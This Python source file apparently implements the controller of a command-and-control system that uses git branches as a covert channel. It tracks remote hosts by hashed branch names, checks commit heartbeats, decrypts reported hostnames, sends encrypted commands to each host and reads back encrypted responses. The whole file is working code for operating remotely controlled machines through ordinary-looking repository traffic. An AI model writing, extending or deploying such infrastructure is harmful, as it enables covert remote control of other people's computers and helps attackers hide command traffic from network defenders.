import asyncio
import os
from datetime import datetime
from typing import Dict, List, Optional
from master.models import Session
from master.core import GitHandler, Crypto

class SessionManager:
    def __init__(self, git_handler: GitHandler, crypto: Crypto):
        self.git_handler = git_handler
        self.crypto = crypto
        self.sessions: Dict[str, Session] = {}
        
    async def scan_for_sessions(self):
        """Scans git repository for active sessions"""
        branches = self.git_handler.get_active_branches()
        print(f"Found branches: {branches}")
        
        # Mark all sessions as inactive initially
        for session in self.sessions.values():
            session.status = "inactive"
        
        for branch in branches:
            if len(branch) == 10:  # MD5 hash first 10 chars
                print(f"Checking branch: {branch}")
                
                # Check README.md for heartbeat
                last_commit = self.git_handler.get_last_commit_time(branch)
                if last_commit:
                    time_diff = (datetime.now() - last_commit).total_seconds()
                    is_active = time_diff < 180  # 3 minutes threshold
                    
                    # Read hostname from host file for new sessions only
                    if branch not in self.sessions:
                        # Get hostname from host file
                        hostname = branch  # Default to branch name
                        self.git_handler.repo.git.fetch('origin', branch)
                        self.git_handler.repo.git.checkout('-B', branch, f'origin/{branch}')
                        host_file = os.path.join(self.git_handler.config.local_repo_path, "host")
                        if os.path.exists(host_file):
                            with open(host_file, "r") as f:
                                encrypted_hostname = f.read().strip()
                                decrypted_hostname = self.crypto.decrypt(encrypted_hostname)
                                if decrypted_hostname:
                                    hostname = decrypted_hostname.strip()
                        
                        # Create new session
                        self.sessions[branch] = Session(
                            id=branch,
                            hostname=hostname,
                            last_seen=last_commit,
                            status="active" if is_active else "inactive",
                            jobs=[]
                        )
                    else:
                        # Update existing session without changing hostname
                        self.sessions[branch].last_seen = last_commit
                        self.sessions[branch].status = "active" if is_active else "inactive"

    async def get_active_sessions(self) -> List[Session]:
        """Returns list of active sessions"""
        return [s for s in self.sessions.values() if s.is_active]

    async def get_session(self, session_id: str) -> Optional[Session]:
        """Get session by ID"""
        return self.sessions.get(session_id)

    async def send_command(self, session_id: str, command: str) -> bool:
        """Send command to specific session"""
        if session_id not in self.sessions:
            return False
            
        encrypted_cmd = self.crypto.encrypt(command)
        return self.git_handler.write_command(session_id, encrypted_cmd)

    async def remove_session(self, session_id: str) -> bool:
        """Remove a session and its git branch"""
        if session_id not in self.sessions:
            return False
        
        success = self.git_handler.delete_branch(session_id)
        if success:
            del self.sessions[session_id]
            print(f"Successfully deleted session and branch: {session_id}")
        else:
            print(f"Failed to delete branch for session: {session_id}")
        return success

    async def get_response(self, session_id: str) -> Optional[str]:
        """Get response from specific session"""
        if session_id not in self.sessions:
            return None
            
        encrypted_response = self.git_handler.read_response(session_id)
        if encrypted_response:
            return self.crypto.decrypt(encrypted_response)
        return None
